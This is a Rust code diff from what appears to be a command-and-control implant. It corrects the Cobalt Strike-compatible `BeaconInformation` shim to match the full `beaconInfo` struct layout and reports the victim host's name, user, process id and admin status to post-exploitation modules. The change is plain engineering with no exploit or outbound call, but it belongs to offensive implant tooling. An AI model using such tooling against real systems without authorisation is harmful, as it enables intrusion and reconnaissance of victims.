@@ -627,22 +627,99 @@ pub unsafe extern "C" fn BeaconCleanupProcess(pi: *mut core::ffi::c_void) {
     }
 }
 
-/// `void BeaconInformation(beaconInfo *info)` — fill a small struct with
-/// implant metadata (pid, user, host, arch, is_admin). The CS struct layout
-/// varies; v1 writes a minimal {pid, is_admin} prefix and leaves the rest for a
-/// documented future extension once the full struct is pinned down.
+/// CS `beaconInfo.version` tag (`BEACON_INFO_VERSION`). BOFs check this
+/// before reading the struct's fields.
+const BEACON_INFO_VERSION: u32 = 1;
+
+/// `void BeaconInformation(beaconInfo *info)` — fill a `beaconInfo` with
+/// implant metadata.
+///
+/// Layout follows the CS `beaconInfo` ABI (community beacon.h):
+/// `version u32 @0` (BEACON_INFO_VERSION = 1), `pid u32 @4`,
+/// `hostname ptr @8`, `user ptr @0x10`, … (middle fields left zeroed — the
+/// shim reports only what the implant can truthfully provide), and
+/// `BOOL isadmin` as the LAST field (@0x88, struct size 0x8C on x64). The old
+/// shim wrote {pid @0, is_admin @4} — the wrong offsets for every real BOF.
+/// Compile-time asserts below pin the offsets so a future field reorder cannot
+/// silently break the ABI.
 #[repr(C)]
 pub struct BeaconInfo {
-    pub pid: u32,
-    pub is_admin: i32,
+    pub version: u32,       // 0x00 BEACON_INFO_VERSION (1)
+    pub pid: u32,           // 0x04
+    pub hostname: *mut u8,  // 0x08
+    pub user: *mut u8,      // 0x10
+    pub arch: u32,          // 0x18 (PROCESS_ARCH_*; 0 = not provided)
+    pub ip: *mut u8,        // 0x20
+    pub bid: *mut u8,       // 0x28
+    pub port: *mut u8,      // 0x30
+    pub computer: *mut u8,  // 0x38
+    pub magic: u32,         // 0x40
+    pub unknown: u32,       // 0x44
+    pub internal: u32,      // 0x48
+    pub pid64: u32,         // 0x4C
+    pub os: u32,            // 0x50
+    pub arch_name: *mut u8, // 0x58 (C name: `arch`)
+    pub osinfo: *mut u8,    // 0x60
+    pub domain: *mut u8,    // 0x68
+    pub spawn: *mut u8,     // 0x70
+    pub ps1: *mut u8,       // 0x78
+    pub pipename: *mut u8,  // 0x80
+    pub isadmin: i32,       // 0x88 — BOOL, LAST field
 }
+
+/// Compile-time guard: the CS ABI offsets above must never drift. If a field
+/// is reordered/added, these asserts fail at build time instead of silently
+/// breaking every BOF that reads `beaconInfo` at fixed offsets.
+const _: () = {
+    assert!(core::mem::offset_of!(BeaconInfo, version) == 0x00);
+    assert!(core::mem::offset_of!(BeaconInfo, pid) == 0x04);
+    assert!(core::mem::offset_of!(BeaconInfo, hostname) == 0x08);
+    assert!(core::mem::offset_of!(BeaconInfo, user) == 0x10);
+    assert!(core::mem::offset_of!(BeaconInfo, isadmin) == 0x88);
+    // 0x8C payload + 4 bytes tail padding to the struct's 8-byte alignment
+    // (repr(C) pads the tail exactly like the C `beaconInfo` would).
+    assert!(core::mem::size_of::<BeaconInfo>() == 0x90);
+};
+
+/// Scratch C-string buffers backing the `hostname`/`user` pointers in
+/// [`BeaconInfo`]. `static mut` (writable `.data`), so the pointers stay valid
+/// after [`BeaconInformation`] returns — CS's contract is that `beaconInfo`
+/// fields remain readable for the BOF's lifetime. Re-initialized every call so
+/// a BOF that scribbled them last time sees fresh data (same pattern as
+/// [`BeaconGetSpawnTo`]).
+const INFO_CSTR_CAP: usize = 260;
+static mut INFO_HOST: [u8; INFO_CSTR_CAP] = [0; INFO_CSTR_CAP];
+static mut INFO_USER: [u8; INFO_CSTR_CAP] = [0; INFO_CSTR_CAP];
+
+/// Copy `s` as a NUL-terminated C string into the scratch buffer; return the
+/// buffer pointer.
+///
+/// # Safety
+/// `buf` must be a valid writable `[u8; INFO_CSTR_CAP]` (the statics above).
+unsafe fn info_cstr(buf: *mut [u8; INFO_CSTR_CAP], s: &str) -> *mut u8 {
+    let n = s.len().min(INFO_CSTR_CAP - 1);
+    let base = buf.cast::<u8>();
+    core::ptr::copy_nonoverlapping(s.as_ptr(), base, n);
+    *base.add(n) = 0;
+    base
+}
+
 #[no_mangle]
 pub unsafe extern "C" fn BeaconInformation(info: *mut BeaconInfo) {
     if info.is_null() {
         return;
     }
+    // Zero the whole struct first: every field we don't populate (ip, bid,
+    // port, computer, …) must read as null/0 — "not provided" — never as
+    // stack garbage.
+    core::ptr::write_bytes(info, 0, 1);
+    let host = info_cstr(&raw mut INFO_HOST, &crate::hostinfo::hostname());
+    let user = info_cstr(&raw mut INFO_USER, &crate::hostinfo::username());
+    (*info).version = BEACON_INFO_VERSION;
     (*info).pid = crate::hostinfo::pid();
-    (*info).is_admin = crate::hostinfo::is_admin() as i32;
+    (*info).hostname = host;
+    (*info).user = user;
+    (*info).isadmin = crate::hostinfo::is_admin() as i32;
 }
 
 // ============================================================================
